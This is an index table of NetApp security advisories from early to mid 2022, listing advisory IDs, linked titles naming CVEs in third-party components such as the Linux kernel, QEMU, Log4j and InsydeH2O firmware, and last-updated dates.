| [**NTAP-20220513-0006**](https://security.netapp.com/advisory/ntap-20220513-0006/) | CVE-2022-24785 NPM Vulnerability in NetApp Products | 2022-07-01 |
| [**NTAP-20220506-0006**](https://security.netapp.com/advisory/ntap-20220506-0006/) | April 2022 Linux Kernel Vulnerabilities in NetApp Products | 2023-02-07 |
| [**NTAP-20220506-0005**](https://security.netapp.com/advisory/ntap-20220506-0005/) | April 2022 OpenBSD Vulnerabilities in NetApp Products | 2022-05-16 |
| [**NTAP-20220506-0003**](https://security.netapp.com/advisory/ntap-20220506-0003/) | CVE-2017-12652 Libpng Vulnerability in NetApp Products | 2022-07-01 |
| [**NTAP-20220506-0001**](https://security.netapp.com/advisory/ntap-20220506-0001/) | CVE-2019-5188 E2fsprogs Vulnerability in NetApp Products | 2022-05-06 |
| [**NTAP-20220506-0004**](https://security.netapp.com/advisory/ntap-20220506-0004/) | CVE-2020-36518 FasterXML Jackson Databind Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20220506-0007**](https://security.netapp.com/advisory/ntap-20220506-0007/) | CVE-2022-1055 Linux Kernel Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20220506-0002**](https://security.netapp.com/advisory/ntap-20220506-0002/) | March 2022 LibTIFF Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20220429-0006**](https://security.netapp.com/advisory/ntap-20220429-0006/) | April 2022 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2024-11-11 |
| [**NTAP-20220429-0005**](https://security.netapp.com/advisory/ntap-20220429-0005/) | April 2022 MySQL Server Vulnerabilities in NetApp Products | 2023-02-07 |
| [**NTAP-20220429-0003**](https://security.netapp.com/advisory/ntap-20220429-0003/) | CVE-2021-3582 QEMU Vulnerability in NetApp Products | 2022-04-29 |
| [**NTAP-20220429-0004**](https://security.netapp.com/advisory/ntap-20220429-0004/) | CVE-2022-26490 Linux Kernel Vulnerability in NetApp Products | 2022-04-29 |
| [**NTAP-20220429-0002**](https://security.netapp.com/advisory/ntap-20220429-0002/) | CVE-2022-27191 Golang Vulnerability in NetApp Products | 2022-04-29 |
| [**NTAP-20220429-0001**](https://security.netapp.com/advisory/ntap-20220429-0001/) | March 2022 Linux Kernel Vulnerabilities in NetApp Products | 2024-05-09 |
| [**NTAP-20220425-0004**](https://security.netapp.com/advisory/ntap-20220425-0004/) | CVE-2021-3748 QEMU Vulnerability in NetApp Products | 2022-04-25 |
| [**NTAP-20220425-0001**](https://security.netapp.com/advisory/ntap-20220425-0001/) | CVE-2022-0742 Linux Kernel Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20220425-0002**](https://security.netapp.com/advisory/ntap-20220425-0002/) | CVE-2022-1011 Linux Kernel Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20220425-0005**](https://security.netapp.com/advisory/ntap-20220425-0005/) | CVE-2022-26148 Grafana Vulnerability in NetApp Products | 2022-04-25 |
| [**NTAP-20220425-0003**](https://security.netapp.com/advisory/ntap-20220425-0003/) | March 2022 QEMU Vulnerabilities in NetApp Products | 2022-04-25 |
| [**NTAP-20220420-0001**](https://security.netapp.com/advisory/ntap-20220420-0001/) | CVE-2021-31805 Apache Struts Vulnerability in NetApp Products | 2022-04-20 |
| [**NTAP-20220419-0004**](https://security.netapp.com/advisory/ntap-20220419-0004/) | CVE-2021-3609 Linux Kernel Vulnerability in NetApp Products | 2022-05-31 |
| [**NTAP-20220419-0002**](https://security.netapp.com/advisory/ntap-20220419-0002/) | CVE-2022-0492 Linux Kernel Vulnerability in NetApp Products | 2022-06-09 |
| [**NTAP-20220419-0005**](https://security.netapp.com/advisory/ntap-20220419-0005/) | CVE-2022-26488 Python Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20220419-0003**](https://security.netapp.com/advisory/ntap-20220419-0003/) | February 2022 Linux Kernel 5.15.2 Vulnerabilities in NetApp Products | 2024-05-09 |
| [**NTAP-20220419-0001**](https://security.netapp.com/advisory/ntap-20220419-0001/) | February 2022 Linux Kernel Vulnerabilities in NetApp Products | 2024-05-09 |
| [**NTAP-20220408-0001**](https://security.netapp.com/advisory/ntap-20220408-0001/) | March 2022 ISC BIND Vulnerabilities in NetApp Products | 2022-04-19 |
| [**NTAP-20220407-0003**](https://security.netapp.com/advisory/ntap-20220407-0003/) | CVE-2021-3638 QEMU Vulnerability in NetApp Products | 2022-04-07 |
| [**NTAP-20220407-0002**](https://security.netapp.com/advisory/ntap-20220407-0002/) | CVE-2021-3658 BlueZ Vulnerability in NetApp Products | 2022-04-07 |
| [**NTAP-20220407-0008**](https://security.netapp.com/advisory/ntap-20220407-0008/) | CVE-2021-3677 Postgresql Vulnerability in NetApp Products | 2022-05-04 |
| [**NTAP-20220407-0001**](https://security.netapp.com/advisory/ntap-20220407-0001/) | CVE-2021-3733 Python Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20220407-0009**](https://security.netapp.com/advisory/ntap-20220407-0009/) | CVE-2021-3737 Python Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20220407-0006**](https://security.netapp.com/advisory/ntap-20220407-0006/) | CVE-2021-3739 Linux Kernel Vulnerability in NetApp Products | 2022-04-20 |
| [**NTAP-20220407-0007**](https://security.netapp.com/advisory/ntap-20220407-0007/) | CVE-2021-3743 Linux Kernel Vulnerability in NetApp Products | 2022-04-20 |
| [**NTAP-20220407-0005**](https://security.netapp.com/advisory/ntap-20220407-0005/) | CVE-2022-23812 NPM Vulnerability in NetApp Products | 2022-04-07 |
| [**NTAP-20220407-0004**](https://security.netapp.com/advisory/ntap-20220407-0004/) | February 2022 Node.js Vulnerabilities in NetApp Products | 2024-05-09 |
| [**NTAP-20220401-0001**](https://security.netapp.com/advisory/ntap-20220401-0001/) | CVE-2022-22950 Spring Framework Vulnerability in NetApp Products | 2024-03-11 |
| [**NTAP-20220331-0003**](https://security.netapp.com/advisory/ntap-20220331-0003/) | CVE-2020-36516 Linux Kernel Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20220331-0010**](https://security.netapp.com/advisory/ntap-20220331-0010/) | CVE-2021-3631 Libvirt Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20220331-0005**](https://security.netapp.com/advisory/ntap-20220331-0005/) | CVE-2021-3667 Libvirt Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20220331-0009**](https://security.netapp.com/advisory/ntap-20220331-0009/) | CVE-2022-0516 Linux Kernel Vulnerability in NetApp Products | 2022-04-20 |
| [**NTAP-20220331-0004**](https://security.netapp.com/advisory/ntap-20220331-0004/) | CVE-2022-0543 Redis Vulnerability in NetApp Products | 2022-04-19 |
| [**NTAP-20220331-0002**](https://security.netapp.com/advisory/ntap-20220331-0002/) | CVE-2022-0563 Util-linux Vulnerability in NetApp Products | 2024-07-19 |
| [**NTAP-20220331-0011**](https://security.netapp.com/advisory/ntap-20220331-0011/) | CVE-2022-22965 Spring Framework Vulnerability in NetApp Products | 2022-04-18 |
| [**NTAP-20220331-0008**](https://security.netapp.com/advisory/ntap-20220331-0008/) | CVE-2022-23308 Libxml2 Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20220331-0007**](https://security.netapp.com/advisory/ntap-20220331-0007/) | CVE-2022-24685 HashiCorp Nomad Vulnerability in NetApp Products | 2022-03-31 |
| [**NTAP-20220331-0006**](https://security.netapp.com/advisory/ntap-20220331-0006/) | CVE-2022-24687 HashiCorp Consul Vulnerability in NetApp Products | 2022-03-31 |
| [**NTAP-20220331-0001**](https://security.netapp.com/advisory/ntap-20220331-0001/) | CVE-2022-25365 Docker Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20220325-0003**](https://security.netapp.com/advisory/ntap-20220325-0003/) | CVE-2019-14844 MIT Kerberos 5 Vulnerability in NetApp Products | 2022-06-13 |
| [**NTAP-20220325-0004**](https://security.netapp.com/advisory/ntap-20220325-0004/) | CVE-2021-21708 PHP Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20220325-0011**](https://security.netapp.com/advisory/ntap-20220325-0011/) | CVE-2021-25217 ISC DHCP Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20220325-0005**](https://security.netapp.com/advisory/ntap-20220325-0005/) | CVE-2022-0847 Linux Kernel Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20220325-0008**](https://security.netapp.com/advisory/ntap-20220325-0008/) | CVE-2022-23395 Node.js Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20220325-0009**](https://security.netapp.com/advisory/ntap-20220325-0009/) | CVE-2022-23710 Elasticsearch Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20220325-0010**](https://security.netapp.com/advisory/ntap-20220325-0010/) | CVE-2022-24921 Golang Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20220325-0002**](https://security.netapp.com/advisory/ntap-20220325-0002/) | CVE-2022-25636 Linux Kernel Vulnerability in NetApp Products | 2023-07-26 |
| [**NTAP-20220325-0001**](https://security.netapp.com/advisory/ntap-20220325-0001/) | March 2021 Grub2 Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20220325-0007**](https://security.netapp.com/advisory/ntap-20220325-0007/) | March 2022 Node.js Vulnerabilities in NetApp Products | 2022-06-13 |
| [**NTAP-20220325-0006**](https://security.netapp.com/advisory/ntap-20220325-0006/) | March 2022 NPM Vulnerabilities in NetApp Products | 2022-06-13 |
| [**NTAP-20220324-0001**](https://security.netapp.com/advisory/ntap-20220324-0001/) | CVE-2022-23235 Information Disclosure Vulnerability in Active IQ Unified Manager | 2022-03-24 |
| [**NTAP-20220321-0002**](https://security.netapp.com/advisory/ntap-20220321-0002/) | CVE-2022-0778 OpenSSL Vulnerability in NetApp Products | 2024-10-07 |
| [**NTAP-20220321-0001**](https://security.netapp.com/advisory/ntap-20220321-0001/) | March 2022 Apache HTTP Server Vulnerabilities in NetApp Products | 2022-04-19 |
| [**NTAP-20220318-0009**](https://security.netapp.com/advisory/ntap-20220318-0009/) | CVE-2021-3752 Linux Kernel Vulnerability in NetApp Products | 2022-06-13 |
| [**NTAP-20220318-0007**](https://security.netapp.com/advisory/ntap-20220318-0007/) | CVE-2021-3760 Linux Kernel Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20220318-0003**](https://security.netapp.com/advisory/ntap-20220318-0003/) | CVE-2021-3947 QEMU Vulnerability in NetApp Products | 2022-03-18 |
| [**NTAP-20220318-0010**](https://security.netapp.com/advisory/ntap-20220318-0010/) | CVE-2021-4090 Linux Kernel Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20220318-0006**](https://security.netapp.com/advisory/ntap-20220318-0006/) | CVE-2022-0646 Linux Kernel Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20220318-0005**](https://security.netapp.com/advisory/ntap-20220318-0005/) | CVE-2022-25265 Linux Kernel Vulnerability in NetApp Products | 2022-04-18 |
| [**NTAP-20220318-0008**](https://security.netapp.com/advisory/ntap-20220318-0008/) | February 2022 HashiCorp Vulnerabilities in NetApp Products | 2022-03-18 |
| [**NTAP-20220318-0001**](https://security.netapp.com/advisory/ntap-20220318-0001/) | February 2022 LibTIFF Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20220318-0004**](https://security.netapp.com/advisory/ntap-20220318-0004/) | February 2022 MariaDB Vulnerabilities in NetApp Products | 2022-03-18 |
| [**NTAP-20220318-0002**](https://security.netapp.com/advisory/ntap-20220318-0002/) | February 2022 QEMU Vulnerabilities in NetApp Products | 2022-03-18 |
| [**NTAP-20220311-0001**](https://security.netapp.com/advisory/ntap-20220311-0001/) | CVE-2021-33150 Intel Trace Hub Vulnerability in NetApp Products | 2022-05-16 |
| [**NTAP-20220311-0004**](https://security.netapp.com/advisory/ntap-20220311-0004/) | CVE-2021-4145 QEMU Vulnerability in NetApp Products | 2022-03-11 |
| [**NTAP-20220311-0003**](https://security.netapp.com/advisory/ntap-20220311-0003/) | CVE-2021-46659 MariaDB Vulnerability in NetApp Products | 2022-03-11 |
| [**NTAP-20220311-0005**](https://security.netapp.com/advisory/ntap-20220311-0005/) | CVE-2022-21724 PostgreSQL JDBC Driver Vulnerability in NetApp Products | 2022-03-11 |
| [**NTAP-20220311-0002**](https://security.netapp.com/advisory/ntap-20220311-0002/) | CVE-2022-22844 LibTIFF Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20220303-0002**](https://security.netapp.com/advisory/ntap-20220303-0002/) | CVE-2021-20322 Linux Kernel Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20220303-0006**](https://security.netapp.com/advisory/ntap-20220303-0006/) | CVE-2021-41816 Ruby Vulnerability in NetApp Products | 2022-03-07 |
| [**NTAP-20220303-0001**](https://security.netapp.com/advisory/ntap-20220303-0001/) | CVE-2021-45346 SQLite Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20220303-0004**](https://security.netapp.com/advisory/ntap-20220303-0004/) | CVE-2022-21673 Grafana Vulnerability in NetApp Products | 2022-03-03 |
| [**NTAP-20220303-0009**](https://security.netapp.com/advisory/ntap-20220303-0009/) | CVE-2022-23232 Access Bypass Vulnerability in StorageGRID (formerly StorageGRID Webscale) | 2022-03-03 |
| [**NTAP-20220303-0010**](https://security.netapp.com/advisory/ntap-20220303-0010/) | CVE-2022-23233 Denial of Service Vulnerability in StorageGRID (formerly StorageGRID Webscale) | 2022-03-03 |
| [**NTAP-20220303-0003**](https://security.netapp.com/advisory/ntap-20220303-0003/) | CVE-2022-23913 Apache ActiveMQ Artemis Vulnerability in NetApp Products | 2023-03-07 |
| [**NTAP-20220303-0008**](https://security.netapp.com/advisory/ntap-20220303-0008/) | February 2022 Expat Vulnerabilities in NetApp Products | 2022-08-29 |
| [**NTAP-20220303-0005**](https://security.netapp.com/advisory/ntap-20220303-0005/) | February 2022 Grafana Vulnerabilities in NetApp Products | 2022-03-07 |
| [**NTAP-20220303-0007**](https://security.netapp.com/advisory/ntap-20220303-0007/) | February 2022 NGINX Vulnerabilities in NetApp Products | 2024-01-02 |
| [**NTAP-20220228-0001**](https://security.netapp.com/advisory/ntap-20220228-0001/) | CVE-2022-23234 Information Disclosure Vulnerability in SnapCenter | 2022-02-28 |
| [**NTAP-20220225-0002**](https://security.netapp.com/advisory/ntap-20220225-0002/) | CVE-2020-8562 Kubernetes Vulnerability in NetApp Products | 2022-04-28 |
| [**NTAP-20220225-0005**](https://security.netapp.com/advisory/ntap-20220225-0005/) | CVE-2021-20373 IBM DB2 Vulnerability in NetApp Products | 2022-02-25 |
| [**NTAP-20220225-0007**](https://security.netapp.com/advisory/ntap-20220225-0007/) | CVE-2021-3930 QEMU Vulnerability in NetApp Products | 2022-02-25 |
| [**NTAP-20220225-0004**](https://security.netapp.com/advisory/ntap-20220225-0004/) | CVE-2021-4154 Linux Kernel Vulnerability in NetApp Products | 2023-05-22 |
| [**NTAP-20220225-0001**](https://security.netapp.com/advisory/ntap-20220225-0001/) | CVE-2021-44521 Apache Cassandra Vulnerability in NetApp Products | 2022-02-25 |
| [**NTAP-20220225-0003**](https://security.netapp.com/advisory/ntap-20220225-0003/) | CVE-2022-0185 Linux Kernel Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20220225-0009**](https://security.netapp.com/advisory/ntap-20220225-0009/) | CVE-2022-0391 Python Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20220225-0008**](https://security.netapp.com/advisory/ntap-20220225-0008/) | CVE-2022-24958 Linux Kernel Vulnerability in NetApp Products | 2022-04-14 |
| [**NTAP-20220225-0006**](https://security.netapp.com/advisory/ntap-20220225-0006/) | February 2022 Golang Vulnerabilities in NetApp Products | 2023-03-07 |
| [**NTAP-20220223-0004**](https://security.netapp.com/advisory/ntap-20220223-0004/) | CVE-2019-12532 InsydeH2O Vulnerability in NetApp Products | 2022-02-23 |
| [**NTAP-20220223-0003**](https://security.netapp.com/advisory/ntap-20220223-0003/) | CVE-2020-5955 InsydeH2O Vulnerability in NetApp Products | 2022-02-23 |
| [**NTAP-20220223-0001**](https://security.netapp.com/advisory/ntap-20220223-0001/) | CVE-2020-5956 InsydeH2O Vulnerability in NetApp Products | 2022-02-23 |
| [**NTAP-20220223-0002**](https://security.netapp.com/advisory/ntap-20220223-0002/) | CVE-2021-41842 InsydeH2O Vulnerability in NetApp Products | 2023-09-15 |
| [**NTAP-20220222-0005**](https://security.netapp.com/advisory/ntap-20220222-0005/) | CVE-2020-5953 InsydeH20 Vulnerability in NetApp Products | 2022-02-22 |
| [**NTAP-20220222-0004**](https://security.netapp.com/advisory/ntap-20220222-0004/) | CVE-2021-33625 InsydeH20 Vulnerability in NetApp Products | 2022-08-24 |
| [**NTAP-20220222-0002**](https://security.netapp.com/advisory/ntap-20220222-0002/) | CVE-2021-33627 InsydeH20 Vulnerability in NetApp Products | 2023-01-17 |
| [**NTAP-20220222-0003**](https://security.netapp.com/advisory/ntap-20220222-0003/) | CVE-2021-41837 InsydeH20 Vulnerability in NetApp Products | 2024-12-04 |
| [**NTAP-20220222-0001**](https://security.netapp.com/advisory/ntap-20220222-0001/) | CVE-2021-41838 InsydeH20 Vulnerability in NetApp Products | 2022-11-21 |
| [**NTAP-20220221-0004**](https://security.netapp.com/advisory/ntap-20220221-0004/) | CVE-2019-16884 Docker Vulnerability in NetApp Products | 2022-04-28 |
| [**NTAP-20220221-0001**](https://security.netapp.com/advisory/ntap-20220221-0001/) | CVE-2022-24122 Linux Kernel Vulnerability in NetApp Products | 2023-07-26 |
| [**NTAP-20220221-0003**](https://security.netapp.com/advisory/ntap-20220221-0003/) | February 2022 Django Vulnerabilities in NetApp Products | 2022-04-21 |
| [**NTAP-20220221-0002**](https://security.netapp.com/advisory/ntap-20220221-0002/) | January 2022 MariaDB Vulnerabilities in NetApp Products | 2022-02-21 |
| [**NTAP-20220217-0003**](https://security.netapp.com/advisory/ntap-20220217-0003/) | CVE-2021-25743 Kubernetes Vulnerability in NetApp Products | 2022-02-17 |
| [**NTAP-20220217-0011**](https://security.netapp.com/advisory/ntap-20220217-0011/) | CVE-2021-27796 Brocade Fabric Operating System Firmware Vulnerability | 2022-02-17 |
| [**NTAP-20220217-0004**](https://security.netapp.com/advisory/ntap-20220217-0004/) | CVE-2021-29632 FreeBSD Vulnerability in NetApp Products | 2022-02-17 |
| [**NTAP-20220217-0008**](https://security.netapp.com/advisory/ntap-20220217-0008/) | CVE-2021-34866 Linux Kernel Vulnerability in NetApp Products | 2022-03-11 |
| [**NTAP-20220217-0009**](https://security.netapp.com/advisory/ntap-20220217-0009/) | CVE-2021-39293 Golang Vulnerability in NetApp Products | 2022-04-20 |
| [**NTAP-20220217-0005**](https://security.netapp.com/advisory/ntap-20220217-0005/) | CVE-2021-4083 Linux Kernel Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20220217-0016**](https://security.netapp.com/advisory/ntap-20220217-0016/) | CVE-2021-41839 InsydeH20 Vulnerability in NetApp Products | 2022-11-21 |
| [**NTAP-20220217-0014**](https://security.netapp.com/advisory/ntap-20220217-0014/) | CVE-2021-41840 InsydeH20 Vulnerability in NetApp Products | 2022-02-17 |
| [**NTAP-20220217-0012**](https://security.netapp.com/advisory/ntap-20220217-0012/) | CVE-2021-41841 InsydeH20 Vulnerability in NetApp Products | 2023-01-13 |
| [**NTAP-20220217-0015**](https://security.netapp.com/advisory/ntap-20220217-0015/) | CVE-2021-42060 InsydeH20 Vulnerability in NetApp Products | 2024-12-04 |
| [**NTAP-20220217-0013**](https://security.netapp.com/advisory/ntap-20220217-0013/) | CVE-2021-43323 InsydeH20 Vulnerability in NetApp Products | 2024-12-04 |
| [**NTAP-20220217-0010**](https://security.netapp.com/advisory/ntap-20220217-0010/) | CVE-2022-23181 Apache Tomcat Vulnerability in NetApp Products | 2023-07-26 |
| [**NTAP-20220217-0002**](https://security.netapp.com/advisory/ntap-20220217-0002/) | CVE-2022-23222 Linux Kernel Vulnerability in NetApp Products | 2022-03-11 |
| [**NTAP-20220217-0006**](https://security.netapp.com/advisory/ntap-20220217-0006/) | CVE-2022-23302 Apache Log4j Vulnerability in NetApp Products | 2022-06-06 |
| [**NTAP-20220217-0007**](https://security.netapp.com/advisory/ntap-20220217-0007/) | CVE-2022-23305 Apache Log4j Vulnerability in NetApp Products | 2022-06-06 |
| [**NTAP-20220217-0001**](https://security.netapp.com/advisory/ntap-20220217-0001/) | CVE-2022-23852 Expat Vulnerability in NetApp Products | 2023-10-04 |
| [**NTAP-20220216-0005**](https://security.netapp.com/advisory/ntap-20220216-0005/) | CVE-2020-27339 InsydeH2O Vulnerability in NetApp Products | 2022-02-17 |
| [**NTAP-20220216-0001**](https://security.netapp.com/advisory/ntap-20220216-0001/) | CVE-2021-27797 Brocade Fabric Operating System Firmware Vulnerability | 2022-02-16 |
| [**NTAP-20220216-0006**](https://security.netapp.com/advisory/ntap-20220216-0006/) | CVE-2021-33626 InsydeH2O Vulnerability in NetApp Products | 2022-11-21 |
| [**NTAP-20220216-0008**](https://security.netapp.com/advisory/ntap-20220216-0008/) | CVE-2021-42059 InsydeH20 Vulnerability in NetApp Products | 2022-02-17 |
| [**NTAP-20220216-0012**](https://security.netapp.com/advisory/ntap-20220216-0012/) | CVE-2021-42113 InsydeH20 Vulnerability in NetApp Products | 2022-02-17 |
| [**NTAP-20220216-0007**](https://security.netapp.com/advisory/ntap-20220216-0007/) | CVE-2021-42554 InsydeH2O Vulnerability in NetApp Products | 2023-01-13 |
| [**NTAP-20220216-0003**](https://security.netapp.com/advisory/ntap-20220216-0003/) | CVE-2021-43522 InsydeH20 Vulnerability in NetApp Products | 2022-02-17 |
| [**NTAP-20220216-0010**](https://security.netapp.com/advisory/ntap-20220216-0010/) | CVE-2021-43615 InsydeH20 Vulnerability in NetApp Products | 2022-02-17 |
| [**NTAP-20220216-0011**](https://security.netapp.com/advisory/ntap-20220216-0011/) | CVE-2022-24030 InsydeH20 Vulnerability in NetApp Products | 2024-12-04 |
| [**NTAP-20220216-0009**](https://security.netapp.com/advisory/ntap-20220216-0009/) | CVE-2022-24031 InsydeH20 Vulnerability in NetApp Products | 2022-11-21 |
| [**NTAP-20220216-0002**](https://security.netapp.com/advisory/ntap-20220216-0002/) | CVE-2022-24069 InsydeH20 Vulnerability in NetApp Products | 2024-12-04 |
| [**NTAP-20220216-0004**](https://security.netapp.com/advisory/ntap-20220216-0004/) | January 2022 InsydeH2O Vulnerabilities in NetApp Products | 2022-11-21 |
| [**NTAP-20220211-0001**](https://security.netapp.com/advisory/ntap-20220211-0001/) | CVE-2019-14888 Undertow Vulnerability in NetApp Products | 2022-05-20 |
| [**NTAP-20220211-0002**](https://security.netapp.com/advisory/ntap-20220211-0002/) | CVE-2019-19343 Undertow Vulnerability in NetApp Products | 2022-05-20 |
| [**NTAP-20220210-0018**](https://security.netapp.com/advisory/ntap-20220210-0018/) | CVE-2019-10174 Infinispan Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20220210-0016**](https://security.netapp.com/advisory/ntap-20220210-0016/) | CVE-2019-10184 Undertow Vulnerability in NetApp Products | 2022-05-20 |
| [**NTAP-20220210-0017**](https://security.netapp.com/advisory/ntap-20220210-0017/) | CVE-2019-10212 Undertow Vulnerability in NetApp Products | 2022-05-20 |
| [**NTAP-20220210-0024**](https://security.netapp.com/advisory/ntap-20220210-0024/) | CVE-2019-10219 Hibernate Vulnerability in NetApp Products | 2023-08-08 |
| [**NTAP-20220210-0020**](https://security.netapp.com/advisory/ntap-20220210-0020/) | CVE-2019-14900 Hibernate ORM Vulnerability in NetApp Products | 2024-05-15 |
| [**NTAP-20220210-0019**](https://security.netapp.com/advisory/ntap-20220210-0019/) | CVE-2019-3888 Undertow Vulnerability in NetApp Products | 2022-05-20 |
| [**NTAP-20220210-0015**](https://security.netapp.com/advisory/ntap-20220210-0015/) | CVE-2020-10687 Undertow Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20220210-0002**](https://security.netapp.com/advisory/ntap-20220210-0002/) | CVE-2020-13956 Apache HttpClient Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20220210-0001**](https://security.netapp.com/advisory/ntap-20220210-0001/) | CVE-2020-1954 Apache CXF Vulnerability in NetApp Products | 2022-04-19 |
| [**NTAP-20220210-0023**](https://security.netapp.com/advisory/ntap-20220210-0023/) | CVE-2020-25711 Infinispan Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20220210-0003**](https://security.netapp.com/advisory/ntap-20220210-0003/) | CVE-2020-8908 Guava Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20220210-0005**](https://security.netapp.com/advisory/ntap-20220210-0005/) | CVE-2021-0060 Intel SPS Vulnerability in NetApp Products | 2022-10-11 |
| [**NTAP-20220210-0008**](https://security.netapp.com/advisory/ntap-20220210-0008/) | CVE-2021-0127 Intel Processor Vulnerability in NetApp Products | 2023-01-06 |
| [**NTAP-20220210-0009**](https://security.netapp.com/advisory/ntap-20220210-0009/) | CVE-2021-0145 Intel Processor Vulnerability in NetApp Products | 2022-08-11 |
| [**NTAP-20220210-0013**](https://security.netapp.com/advisory/ntap-20220210-0013/) | CVE-2021-20220 Undertow Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20220210-0011**](https://security.netapp.com/advisory/ntap-20220210-0011/) | CVE-2021-21290 Apache Netty Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20220210-0004**](https://security.netapp.com/advisory/ntap-20220210-0004/) | CVE-2021-29425 Apache Commons IO Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20220210-0006**](https://security.netapp.com/advisory/ntap-20220210-0006/) | CVE-2021-33068 Intel AMT Vulnerability in NetApp Products | 2022-08-10 |
| [**NTAP-20220210-0021**](https://security.netapp.com/advisory/ntap-20220210-0021/) | CVE-2021-3690 Undertow Vulnerability in NetApp Products | 2024-03-11 |
| [**NTAP-20220210-0022**](https://security.netapp.com/advisory/ntap-20220210-0022/) | CVE-2021-37714 jsoup Vulnerability in NetApp Products | 2022-11-04 |
| [**NTAP-20220210-0012**](https://security.netapp.com/advisory/ntap-20220210-0012/) | February 2022 Apache Netty Vulnerabilities in NetApp Products | 2024-03-11 |
| [**NTAP-20220210-0014**](https://security.netapp.com/advisory/ntap-20220210-0014/) | February 2022 Undertow Vulnerabilities in NetApp Products | 2024-11-11 |
| [**NTAP-20220210-0007**](https://security.netapp.com/advisory/ntap-20220210-0007/) | Intel SA-00527 BIOS Firmware Vulnerabilities in NetApp Products | 2022-09-07 |
| [**NTAP-20220210-0010**](https://security.netapp.com/advisory/ntap-20220210-0010/) | Intel SA-00571 Ethernet Controller Vulnerabilities in NetApp Products | 2022-02-18 |
| [**NTAP-20220209-0002**](https://security.netapp.com/advisory/ntap-20220209-0002/) | CVE-2022-21676 NPM Vulnerability in NetApp Products | 2022-06-13 |
| [**NTAP-20220204-0003**](https://security.netapp.com/advisory/ntap-20220204-0003/) | CVE-2020-25638 Hibernate ORM Vulnerability in NetApp Products | 2022-08-03 |
| [**NTAP-20220204-0002**](https://security.netapp.com/advisory/ntap-20220204-0002/) | CVE-2021-22696 Apache CXF Vulnerability in NetApp Products | 2022-02-04 |
| [**NTAP-20220204-0005**](https://security.netapp.com/advisory/ntap-20220204-0005/) | CVE-2021-4160 OpenSSL Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20220204-0004**](https://security.netapp.com/advisory/ntap-20220204-0004/) | CVE-2022-23307 Apache Log4j Vulnerability in NetApp Products | 2022-07-26 |
| [**NTAP-20220204-0006**](https://security.netapp.com/advisory/ntap-20220204-0006/) | CVE-2022-23990 Expat Vulnerability in NetApp Products | 2023-02-10 |
| [**NTAP-20220204-0001**](https://security.netapp.com/advisory/ntap-20220204-0001/) | March 2020 Apache Netty Vulnerabilities in NetApp Products | 2022-02-04 |
| [**NTAP-20220201-0001**](https://security.netapp.com/advisory/ntap-20220201-0001/) | CVE-2021-44141 Samba Vulnerability in NetApp Products | 2022-02-01 |
| [**NTAP-20220201-0002**](https://security.netapp.com/advisory/ntap-20220201-0002/) | CVE-2021-44142 Samba Vulnerability in NetApp Products | 2022-02-01 |
| [**NTAP-20220201-0003**](https://security.netapp.com/advisory/ntap-20220201-0003/) | CVE-2022-0336 Samba Vulnerability in NetApp Products | 2022-02-01 |
| [**NTAP-20220131-0001**](https://security.netapp.com/advisory/ntap-20220131-0001/) | CVE-2021-22060 Spring Framework Vulnerability in NetApp Products | 2024-03-11 |
| [**NTAP-20220131-0002**](https://security.netapp.com/advisory/ntap-20220131-0002/) | CVE-2021-41817 Ruby Vulnerability in NetApp Products | 2022-03-07 |
| [**NTAP-20220131-0005**](https://security.netapp.com/advisory/ntap-20220131-0005/) | CVE-2022-22846 Python Vulnerability in NetApp Products | 2022-04-25 |
| [**NTAP-20220131-0004**](https://security.netapp.com/advisory/ntap-20220131-0004/) | January 2022 Expat Vulnerabilities in NetApp Products | 2022-09-26 |
| [**NTAP-20220131-0003**](https://security.netapp.com/advisory/ntap-20220131-0003/) | January 2022 GNU C Library Vulnerabilities in NetApp Products | 2023-05-22 |
| [**NTAP-20220128-0001**](https://security.netapp.com/advisory/ntap-20220128-0001/) | CVE-2021-4034 PolicyKit Privilege Escalation Vulnerability in NetApp Products | 2022-01-28 |
| [**NTAP-20220121-0003**](https://security.netapp.com/advisory/ntap-20220121-0003/) | CVE-2021-41819 Ruby Vulnerability in NetApp Products | 2022-02-01 |
| [**NTAP-20220121-0002**](https://security.netapp.com/advisory/ntap-20220121-0002/) | CVE-2021-44716 Golang Vulnerability in NetApp Products | 2022-05-12 |
